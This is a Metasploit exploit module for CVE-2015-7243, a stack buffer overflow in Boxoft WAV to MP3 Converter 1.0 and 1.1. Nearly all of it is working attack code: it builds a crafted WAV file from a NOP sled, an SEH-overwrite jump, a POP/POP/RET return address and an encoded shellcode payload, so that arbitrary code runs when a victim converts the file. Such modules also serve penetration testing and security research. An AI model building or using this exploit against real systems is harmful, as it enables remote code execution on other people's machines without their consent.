# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = NormalRanking

  include Msf::Exploit::FILEFORMAT

  def initialize(info={})
    super(update_info(info,
      &#039;Name&#039;           => "Boxoft WAV to MP3 Converter v1.1 Buffer Overflow",
      &#039;Description&#039;    => %q{
       This module exploits a stack buffer overflow in Boxoft WAV to MP3 Converter versions 1.0 and 1.1.
       By constructing a specially crafted WAV file and attempting to convert it to an MP3 file in the
       application, a buffer is overwritten, which allows for running shellcode.
      },
      &#039;License&#039;        => MSF_LICENSE,
      &#039;Author&#039;         =>
        [
          &#039;Robbie Corley&#039;, # EDB POC
          &#039;Shelby Pace&#039;    # Metasploit Module
        ],
      &#039;References&#039;     =>
        [
          [ &#039;CVE&#039;, &#039;2015-7243&#039; ],
          [ &#039;EDB&#039;, &#039;38035&#039; ]
        ],
      &#039;Platform&#039;       => &#039;win&#039;,
      &#039;Targets&#039;        =>
        [
          [
            &#039;Boxoft WAV to MP3 Converter v1.1&#039;,
            {
              &#039;Ret&#039; => 0x0040144c # P/P/R from wavtomp3.exe (1.1.0.0)
            }
          ]
        ],
      &#039;Payload&#039;        =>
        {
          &#039;BadChars&#039; => "\x00"
        },
      &#039;Privileged&#039;     => false,
      &#039;DisclosureDate&#039; => "Aug 31 2015",
      &#039;DefaultTarget&#039;  => 0))

    register_options(
    [
      OptString.new(&#039;FILENAME&#039;, [true, &#039;The malicious file name&#039;, &#039;music.wav&#039;])
    ])
  end

  def exploit
    file_payload = payload.encoded

    buf = make_fast_nops(4132)
    buf << "\xeb\x06#{Rex::Text.rand_text_alpha(2, payload_badchars)}" # nseh (jmp to payload)
    buf << [target.ret].pack("V*")  # seh
    buf << file_payload
    # Size isn&#039;t very sensitive
    buf << make_fast_nops(5860)

    file_create(buf)
  end
end

